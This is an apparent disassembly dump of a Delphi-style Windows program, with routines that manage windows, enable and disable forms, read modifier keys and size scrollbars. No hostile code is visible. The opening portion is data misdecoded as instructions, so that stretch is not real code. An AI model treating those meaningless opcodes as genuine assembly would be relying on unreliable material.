add [ eax ] dl
add al [ eax ]
push [ esi + 0x46 ]
add [ eax + 0x4677 ] bl
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc eax [ eax ]
or al [ ecx + 0x75 ]
je r-xdata
popad
inc edx
insb
outsb
push esp
adc [ eax ] al
loope r-xdata
outsb
je r-xdata
add [ eax + eax ] bh
add dh bh
or [ edx + 0x46 ] bh
insb
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070019 ] al
popad
jo r-xdata
jb r-xdata
outsd
outsb
push ebx
arpl [ edx + 0x6f ] si
insb
insb
add [ eax ] dl
inc eax
add [ eax + eax ] bl
[ eax + eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
pop esp
mov eax 0x10046
add [ eax ] al
add [ eax ] al
add [ eax + 0xff ] al
adc [ eax ] eax
cmovno ebp [ eax + esi * 2 + 0x68 ]
add bh bh
popad
outsb
shl [ eax ] 0x42
add [ eax ] dh
add [ eax + 0x430b001b ] al
insb
imul esp [ ebp + 0x6e ] 0x64695774
add [ eax ] al
jb r-xdata
call 0xffffffff8545452a
mov eax 0x10046
add [ eax ] al
add [ eax ] al
add [ eax ] al
imul ebp [ edi + 0x6e ] r-xdata
cld
loop r-xdata
jae r-xdata
arpl [ edi + 0x6e ] bp
pushad
cmpsd [ esi ] [ edi ]
inc esp
add [ ecx + eax ] ch
call esp
push ecx
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb [ eax ] al
or eax [ edx + 0x6f ]
jb r-xdata
cmp al [ esi ]
sub [ edx ] eax
add bh bh
call 0xffffffffb4468ad4
xchg [ esi ] al
add [ eax ] al
add [ eax + 0x2 ] al
pop ss
add [ ebx ] cl
inc edx
outsd
jb r-xdata
push ebp
jae r-xdata
popad
jb r-xdata
add [ eax + 0x77 ] ah
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
inc esi
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
mov ah 0xe8
inc esp
add ah ah
call 0xffffffff86fa44e2
inc esi
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
popad
jb r-xdata
je r-xdata
add [ eax ] bh
jpe r-xdata
add [ eax ] al
sbb [ edx ] 0x0
or al 0x43
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
add [ eax ] 0x0
add [ eax ] al
outsb
je r-xdata
hlt
outsb
je r-xdata
jo r-xdata
insb
imul esp [ ebp + 0x6e ] 0x69654874
push 0x40103c74
add [ eax + 0x80044e2 ] bh
jpe r-xdata
add [ eax + 0x77 ] ah
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430c001a ] al
sbb eax 0x72541000
popad
outsb
jae r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
outsb
movsb [ edi ] fs : [ esi ]
cmp al 0x46
add [ ecx ] dh
add al [ eax ]
push [ ecx ]
add al [ eax ]
push [ esi + eax * 4 + 0x46 ]
add [ eax + 0x3 ] al
and [ eax ] al
add eax 0x336c7443
inc esp
add [ eax ] dl
inc eax
add [ edi + 0x48ff0001 ] ah
push ebx
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] eax
outsd
insb
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b001f ] al
outsd
outsb
jae r-xdata
outsd
insb
outsd
jb r-xdata
add bh bh
push esp
0xea700044 0x44
dec ebp
outsd
add [ gs : eax ] dl
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
je r-xdata
and [ eax ] eax
push cs
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
popad
insb
jne r-xdata
and al 0x0
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
imul esi [ edi + ebp * 2 + 0x72 ] r-xdata
test al 0x1
add bh bh
nop
cmp al 0x45
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and eax [ eax ]
or [ edi + ebp * 2 + 0x63 ] al
imul edx [ ebx + 0x69 ] 0x74
sub al 0x98
inc esp
add [ ebx - 0x64010000 ] bl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
jb r-xdata
jo r-xdata
jae r-xdata
xor [ edx ] al
in al dx
add al [ eax ]
push [ eax - 0x48 ]
xchg edi eax
inc esp
add [ ebp ] bl
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and eax 0x72440800
popad
outsd
outsb
outsd
arpl [ ebx + 0x4d ] bp
popad
outsb
popad
jb r-xdata
nop
cdq
inc esp
add [ eax + eax ] dh
jmp [ eax + 0x100450d ]
and al [ eax ]
push cs
inc esp
popa
jne r-xdata
add eax [ eax ]
add [ eax ] al
add [ eax ] al
imul ebp [ esi + 0x74 ] 0x40100073
add [ ebp - 0xb00ffff ] ah
push ecx
inc ebp
add [ eax ] bl
push edx
inc ebp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
outsb
je r-xdata
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4305001c ] al
outsd
insb
outsd
jb r-xdata
jo r-xdata
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
adc [ eax ] al
0x44 0x8000
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push ds
add [ 0x6e617254 ] dl
sub_465064
mov edi 0xa8ffbdff
mov edx 0xbad00046
inc esi
add [ eax - 0x45 ] ch
inc esi
add al al
mov ebx 0xbc940046
inc esi
add [ esp + edi * 4 - 0x46d3ffba ] ch
inc esi
add [ eax ] dl
mov edx 0xba7c0046
inc esi
add [ edi ] cl
push esp
inc ebx
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp [ ecx + 0x46 ] dl
je r-xdata
in al dx
push ds
inc edx
add ah ah
push ds
inc edx
add [ edx ] cl
inc edx
add [ eax + 0xe0046bd ] dh
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x380040 ] dl
add [ eax ] al
pop es
push esp
push ebx
arpl [ edx + 0x65 ] si
outsb
mov eax eax
loopne r-xdata
add ah ch
and [ edx ] eax
pop eax
xor eax 0x1b400040
inc edx
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ eax ] cl
mov edi 0x93d80046
inc ecx
add ah dh
sbb eax 0x92f40042
inc ecx
add ah cl
push ds
inc edx
add [ eax - 0x23ffbde3 ] bl
push ds
inc edx
add ah dl
pop ds
inc edx
add [ edx ] al
inc edx
add ah ch
add [ eax ] al
insd
inc esp
outsd
arpl [ ebx + 0x46 ] bp
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dl dl
push edx
inc esi
add [ eax + 0x1 ] al
add [ eax ] al
insb
jae r-xdata
inc esi
add [ edi ] al
pop es
push esp
push ebx
arpl [ edx + 0x65 ] si
outsb
nop
push ecx
inc esi
add [ eax + 0x74 ] ch
inc ecx
add [ edx ] al
add [ 0x6d726f46 ] al
jae r-xdata
add [ eax + eax ] cl
add [ eax ] al
mov al 0x10
inc eax
add [ ebp + esi + 0x40 ] cl
add [ eax ] al
add [ eax ] bh
push ecx
inc esi
mov al [ 0x7004650 ]
andps xmm0 [ ebx + 0x75 ]
jae r-xdata
in al dx
push ds
inc edx
add ah ah
push ds
inc edx
add [ edx ] cl
inc edx
add [ esi + ecx * 8 + 0xe0046 ] dl
add [ eax ] al
add [ eax ] al
push es
add [ eax ] al
add [ eax + edx + 0x380040 ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] al
cmp al 0x0
add [ eax ] al
and al 0xb6
inc edx
add [ eax + eax ] cl
add [ eax + edx + 0x500040 ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] al
push esp
add [ eax ] al
add [ eax + edx + 0x8c0040 ] dl
add [ eax ] al
or al 0x54
inc ecx
jo r-xdata
add ah ch
and [ edx ] eax
pop eax
xor eax 0x1b400040
inc edx
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ eax + r-xdata ] dl
push cs
or [ eax + ecx * 2 + 0x69 ] edx
outsb
je r-xdata
add [ eax + 0x35 ] bl
outsd
insd
inc esp
outsd
arpl [ ebx + 0x46 ] bp
outsd
jb r-xdata
cli
[ edx + 0x37 ]
insb
imul esp [ ebx + 0x61 ] 0x6e6f6974
nop
in al 0x52
inc esi
add [ edi ] al
or al 0x54
inc ecx
jo r-xdata
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ eax - 0x27ffb930 ] al
xchg ebx eax
inc ecx
add ah dh
sbb eax 0x92f40042
inc ecx
add ah cl
push ds
inc edx
add [ eax - 0x23ffbde3 ] bl
push ds
inc edx
add ah dl
pop ds
inc edx
add [ edx ] al
inc edx
add ah ch
sbb eax [ edx ]
pushad
xor eax 0x35540040
inc eax
outsb
outsw
inc eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x380040 ] dl
add [ eax ] al
nop
push 0x4652
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x1bffb9ae ] bl
push edx
inc esi
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + esi ] cl
pushad
dec edi
inc esi
add [ eax + 0x41 ] dl
inc esi
add [ esi ] cl
add [ 0x6d726f46 ] al
jae r-xdata
[ esi + 0x5b ]
insb
imul esp [ ebx + 0x61 ] 0x6e6f6974
push 0x68004652
je r-xdata
cmp al 0x10
inc eax
add [ eax ] al
mov al [ esi ]
adc al 0x8a
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x500d000d ] al
imul edi [ eax + 0x65 ] 0x6550736c
jb r-xdata
add [ eax + edx ] bh
retn
and [ 0xfffffffffffffdff ] ah
push eax
push 0xffffffec
push esi
call SetWindowLongA
push 0x37
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push esi
call SetWindowPos
pop esi
pop ebx
add [ edx ] al
add [ 0x6d726f46 ] al
jae r-xdata
inc eax
add [ eax ] cl
push esp
dec ebp
outsd
outsb
imul esi [ edi + ebp * 2 + 0x72 ] 0x9000408d
push ecx
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
push ecx
inc esi
add al ah
push ecx
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dl dl
push ecx
inc esi
add [ eax + 0x6c000000 ] ah
jae r-xdata
xor al [ eax ]
or al 0x33
outsb
arpl [ eax - 0x70 ] bp
cmp [ ecx + 0x46 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + rw-data ] ah
retn
sub_465314
push ebx
push esi
mov ebx edx
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
push 0xffffffec
push esi
call GetWindowLongA
test bl bl
je r-xdata
test ah 0x2
je r-xdata
test ah 0x2
jne r-xdata
and eax 0xfffffdff
or eax 0x200
jmp r-xdata
push eax
push 0xffffffec
push esi
call SetWindowLongA
push 0x37
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push esi
call SetWindowPos
sub_465360
mov eax [ rw-data ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_46ea7c
mov eax [ rw-data ]
call sub_421d1c
mov eax [ rw-data ]
call sub_421cc4
retn
push 0x0
push eax
call ShowOwnedPopups
sub_465398
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx [ rw-data ]
je r-xdata
or eax 0xffffffff
pop ebx
pop ebp
retn 0x8
push ebx
call IsWindowVisible
test eax eax
je r-xdata
push ebx
call IsWindowEnabled
test eax eax
je r-xdata
mov eax 0x8
call sub_4026ec
mov edx [ rw-data ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
mov [ rw-data ] eax
push 0x0
push ebx
call EnableWindow
sub_4653e8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x4 ] edx
mov edx [ rw-data ]
mov [ ebp - 0x8 ] edx
mov edx [ rw-data ]
mov [ ebp - 0xc ] edx
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
push ebp
push sub_46548b
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_465454
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push sub_465398
call GetCurrentThreadId
push eax
call EnumThreadWindows
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_465492
mov eax [ ebp - 0xc ]
mov [ rw-data ] eax
mov eax [ ebp - 0x8 ]
mov [ rw-data ] eax
retn
sub_46549c
push ebx
push esi
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov ebx esi
mov eax [ ebx + 0x4 ]
push eax
call IsWindow
test eax eax
je r-xdata
mov esi [ ebx ]
mov edx 0x8
mov eax ebx
call sub_40270c
test esi esi
jne r-xdata
push 0xffffffff
mov eax [ ebx + 0x4 ]
push eax
call EnableWindow
sub_4654d4
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx [ rw-data ]
je r-xdata
or eax 0xffffffff
pop ebx
pop ebp
retn 0x8
mov eax [ rw-data ]
cmp ebx [ eax + 0x30 ]
je r-xdata
push ebx
call IsWindowVisible
test eax eax
je r-xdata
push ebx
call IsWindowEnabled
test eax eax
je r-xdata
push 0xffffffec
push ebx
call GetWindowLongA
test al 0x8
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
mov [ rw-data ] ebx
mov [ rw-data ] ebx
jmp r-xdata
sub_465538
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
push 0x0
push sub_4654d4
call GetCurrentThreadId
push eax
call EnumThreadWindows
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
retn
mov eax [ rw-data ]
retn
sub_465594
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0xc ]
or edx 0xffffffff
mov ecx eax
mov ebx [ ecx ]
cmp ebx [ ebp + 0x8 ]
jne r-xdata
mov eax edx
pop ebx
pop ebp
retn 0x8
xor edx edx
mov [ ecx + 0x4 ] 0x1
sub_4655b4
add esp 0xfffffff8
call GetActiveWindow
mov [ esp ] eax
mov [ esp + 0x4 ] 0x0
mov eax esp
push eax
push sub_465594
call GetCurrentThreadId
push eax
call EnumThreadWindows
mov al [ esp + 0x4 ]
pop ecx
pop edx
retn
sub_4655e0
push ebx
push esi
push edi
push ebp
mov ebp eax
mov eax [ rw-data ]
call sub_46c05c
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ rw-data ]
call sub_46c4cc
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
xor ebx ebx
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ ebx + 0x8 ]
mov eax ebp
call sub_40812c
test eax eax
je r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
inc edi
dec esi
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_46c048
mov ebx eax
test [ ebx + 0x1d ] 0x2
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_46c4b8
mov ebx eax
mov edx [ ebx + 0x8 ]
mov eax ebp
call sub_40812c
test eax eax
je r-xdata
sub_46567c
push ebx
push esi
mov esi eax
mov bl [ r-xdata ]
test si 0x4
je r-xdata
test si 0x8
je r-xdata
or bl 0x1
test si 0x1
je r-xdata
or bl 0x4
test si 0x2
je r-xdata
or bl 0x8
test si 0x10
je r-xdata
or bl 0x10
push 0x12
call GetKeyState
test ax ax
jge r-xdata
or bl 0x20
mov eax ebx
pop esi
pop ebx
retn
or bl 0x2
sub_4656d0
push ebx
push esi
mov esi eax
mov bl [ r-xdata ]
push 0x10
call GetKeyState
test ax ax
jge r-xdata
push 0x11
call GetKeyState
test ax ax
jge r-xdata
or bl 0x1
test esi 0x20000000
je r-xdata
or bl 0x4
mov eax ebx
pop esi
pop ebx
retn
or bl 0x2
sub_46570c
push ebx
push esi
mov esi eax
mov bl [ r-xdata ]
test [ esi + 0x10 ] 0x80
je r-xdata
test [ esi + 0x11 ] 0x80
je r-xdata
or bl 0x1
test [ esi + 0x12 ] 0x80
je r-xdata
or bl 0x4
test [ esi + 0x1 ] 0x80
je r-xdata
or bl 0x2
test [ esi + 0x2 ] 0x80
je r-xdata
or bl 0x8
test [ esi + 0x4 ] 0x80
je r-xdata
or bl 0x10
mov eax ebx
pop esi
pop ebx
retn
or bl 0x20
sub_465758
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4657b6
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_4632b8
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x8 ]
mov edx ebx
call sub_404300
mov eax [ ebp - 0x8 ]
pop edx
call sub_40812c
test eax eax
sete al
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4657bd
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40413c
retn
sub_4657c8
push ebx
mov ebx eax
jmp r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
jne r-xdata
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
pop ebx
retn
sub_4657f0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor edx edx
mov [ ebp - 0xc ] edx
mov esi eax
xor eax eax
push ebp
push sub_465861
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_4657c8
mov ebx eax
test ebx ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_465868
lea eax [ ebp - 0xc ]
call sub_404118
retn
mov eax [ esi + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405f7c
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bdc8
call sub_403ad0
sub_465870
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4032ec
mov [ edi + 0x4 ] esi
mov al [ ebp + 0x8 ]
mov [ edi + 0x18 ] al
mov cx 0x50
mov [ edi + 0xa ] cx
movzx eax cx
mov ecx 0xa
xor edx edx
div ecx
mov [ edi + 0x8 ] ax
mov [ edi + 0x1c ] 0x1
mov [ edi + 0x20 ] 0xa
mov [ edi + 0x40 ] 0x4
mov [ edi + 0x3c ] 0xc
mov [ edi + 0x28 ] 0xff000014
mov [ edi + 0x2c ] 0x1
mov [ edi + 0x44 ] 0x1
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_465900
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_4192f4
mov edi esi
mov dl [ edi + 0x1c ]
mov eax ebx
call sub_4661c8
mov edx [ edi + 0x10 ]
mov eax ebx
call sub_4661a8
mov edx [ edi + 0xc ]
mov eax ebx
call sub_466058
mov ax [ edi + 0x8 ]
mov [ ebx + 0x8 ] ax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_465950
push ebx
mov ebx eax
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_465b08
test al al
je r-xdata
mov eax [ ebx + 0x4 ]
call sub_44ef40
test al al
jne r-xdata
mov edx [ ebx + 0x10 ]
mov eax ebx
call sub_466058
xor edx edx
mov eax ebx
call sub_466058
jmp r-xdata
sub_465988
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop ebx
pop ebp
retn
mov al [ ebx + 0x5b ]
sub al 0x1
jb r-xdata
cmp [ ebx + 0x5b ] 0x3
je r-xdata
sub al 0x2
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax + 0xc ]
add edx [ ebx + 0x40 ]
add edx [ ebx + 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_42a4c0
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov al [ r-xdata ]
and al [ ebx + 0x61 ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
dec al
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx + 0x48 ]
add [ eax - 0xc ] edx
jmp r-xdata
sub_4659f4
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop ebx
pop ebp
retn
mov al [ ebx + 0x5b ]
sub al 0x2
jb r-xdata
cmp [ ebx + 0x5b ] 0x1
je r-xdata
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax + 0xc ]
add edx [ ebx + 0x44 ]
add edx [ ebx + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_42a4c0
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov al [ r-xdata ]
and al [ ebx + 0x61 ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx + 0x4c ]
add [ eax - 0xc ] edx
jmp r-xdata
sub_465a5c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov ebx [ eax + 0x4 ]
cmp [ ebx + 0x210 ] 0x0
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc8 ]
test al al
je r-xdata
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_466190
xor eax eax
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_451de4
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov edx [ ebp - 0x4 ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
movzx eax [ eax + 0x1a ]
add edx eax
mov eax [ ebp - 0x8 ]
call sub_466190
jmp r-xdata
inc ebx
xor esi esi
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx esi
call sub_451da8
call sub_4659f4
pop ecx
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx esi
call sub_451da8
call sub_465988
pop ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
inc esi
dec ebx
jne r-xdata
sub_465b08
push ebx
push esi
mov ebx eax
mov esi 0x100000
cmp [ ebx + 0x18 ] 0x1
jne r-xdata
cmp [ ebx + 0x1c ] 0x0
je r-xdata
mov esi 0x200000
xor eax eax
pop esi
pop ebx
retn
push 0xfffffff0
mov eax [ ebx + 0x4 ]
call sub_4550b4
push eax
call GetWindowLongA
test eax esi
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_465b40
push ebp
mov ebp esp
push ebx
mov ebx 0x100000
cmp ax 0x1
jne r-xdata
push 0xfffffff0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_4550b4
push eax
call GetWindowLongA
test eax ebx
setne al
pop ebx
pop ebp
retn
mov ebx 0x200000
sub_465b74
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5 ] 0x0
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x6 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x6 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_465b40
pop ecx
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_465b40
pop ecx
test al al
je r-xdata
movzx eax di
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
mov eax [ ebp + 0x8 ]
sub ebx [ eax - 0xc ]
neg ebx
jmp r-xdata
movzx eax di
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
mov eax [ ebp + 0x8 ]
sub ebx [ eax - 0xc ]
sub_465bf0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x6 ] cl
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
push 0xfffffff0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_4550b4
push eax
call GetWindowLongA
test eax 0x840000
setne al
and eax 0x7f
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x18 ] 0x1
jne r-xdata
push ebp
mov dx 0x14
mov ax 0x1
call sub_465b74
pop ecx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_44e2b8
add ebx eax
mov eax ebx
push ebp
mov dx 0x15
xor eax eax
call sub_465b74
pop ecx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_44e2fc
add ebx eax
mov eax ebx
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
sub_465c88
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
mov [ ebp - 0x1c ] 0x1c
mov [ ebp - 0x18 ] 0x10
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x18 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x8 ]
movsx esi [ esi + 0x6 ]
lea eax [ ebp - 0x1c ]
push eax
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_4550b4
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
je r-xdata
mov ebx 0x1
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi [ ebp - 0x4 ]
sub_465ce8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1f ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
movsx eax [ eax + 0x4 ]
cmp eax 0x7
ja r-xdata
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x4
jae r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp [ eax * 4 + jump_table_465eb9 ]
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x2
jb r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
sub edx eax
mov eax [ ebp - 0x4 ]
call sub_466058
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
add edx eax
mov eax [ ebp - 0x4 ]
call sub_466058
jmp r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_465bf0
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0xc ]
sub edx eax
mov eax [ ebp - 0x4 ]
call sub_466058
jmp r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_465bf0
mov edx eax
mov eax [ ebp - 0x4 ]
add edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_466058
jmp r-xdata
mov eax [ ebp - 0x4 ]
